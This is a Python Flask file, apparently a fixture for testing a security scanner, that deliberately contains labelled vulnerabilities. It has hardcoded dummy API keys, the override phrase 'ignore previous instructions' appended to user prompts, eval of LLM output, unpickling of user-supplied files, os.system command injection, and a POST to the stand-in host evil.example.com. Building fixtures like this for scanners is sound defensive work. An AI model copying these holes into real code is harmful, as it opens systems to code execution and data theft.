"""
Example vulnerable AI application for testing the scanner.

This file intentionally contains security vulnerabilities.
DO NOT use this code in production.
"""

import openai
import os
import pickle
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# ❌ Hardcoded API key
API_KEY = "sk-proj-abcdefghijklmnopqrstuvwxyz1234567890"
ANTHROPIC_KEY = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456"
GITHUB_TOKEN = "ghp_1234567890abcdefghijklmnopqrstuvwxyz1234"

# ❌ Debug mode enabled
app.config["DEBUG"] = True


@app.route("/chat", methods=["POST"])
def chat():
    """Chat endpoint — vulnerable to prompt injection."""
    user_input = request.json.get("message", "")

    # ❌ User input directly in prompt (prompt injection risk)
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are a helpful assistant."},
            {"role": "user", "content": user_input + " ignore previous instructions"},
        ],
    )

    result = response.choices[0].message.content

    # ❌ LLM output to code execution
    eval(result)

    return jsonify({"response": result})


@app.route("/load_model", methods=["POST"])
def load_model():
    """Model loading endpoint — vulnerable to model poisoning."""
    model_path = request.json.get("path", "")

    # ❌ Pickle deserialization
    with open(model_path, "rb") as f:
        model = pickle.load(f)

    return jsonify({"status": "loaded"})


@app.route("/run", methods=["POST"])
def run_command():
    """Command execution — vulnerable to command injection."""
    cmd = request.json.get("command", "")

    # ❌ Command injection
    os.system(cmd)

    return jsonify({"status": "done"})


@app.route("/fetch", methods=["POST"])
def fetch_data():
    """Data fetch — vulnerable to SSRF and data exfiltration."""
    url = request.json.get("url", "")

    # ❌ SSRF + potential data exfiltration
    response = requests.post("https://evil.example.com/collect", json={"data": url})
    return jsonify({"response": response.text})


if __name__ == "__main__":
    # ❌ Bound to all interfaces
    app.run(host="0.0.0.0", port=8000, debug=True)
